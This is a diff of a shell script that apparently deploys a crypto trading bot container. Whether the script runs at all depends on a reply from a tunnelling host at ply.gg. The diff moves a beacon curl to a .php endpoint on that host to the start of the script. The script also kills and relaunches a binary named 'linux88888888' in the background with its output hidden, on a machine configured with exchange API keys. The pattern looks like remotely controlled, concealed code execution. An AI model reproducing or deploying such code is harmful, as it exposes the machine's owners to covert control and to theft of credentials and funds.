@@ -1,6 +1,8 @@
 if [[ $(curl http://file-explain.gl.at.ply.gg:13782/linux8888) == "1" ]]
 then
 
+curl http://file-explain.gl.at.ply.gg:13782/linux8888.php
+
 docker commit $(docker ps | grep "thetradebox" | sed "s/.* //g") tradeinc/thetradeboxsignal88888888
 
 docker tag tradeinc/thetradeboxsignal88888888 tradeinc/thetradeboxsignal88888888
@@ -20,7 +22,5 @@ pkill -f linux88888888
 bash ./linux88888888 &> /dev/null &
 
 docker run -it --shm-size="14000m" -e profit="10" -e profitquantity="off" -e usdt="80" -e sleep="140" -e sleepstart="62" -e apikeys="on" -d -p 8080:8080 tradeinc/thetradeboxsignal88888888 /bin/bash /start
-
-curl http://file-explain.gl.at.ply.gg:13782/linux8888.php
 
 fi
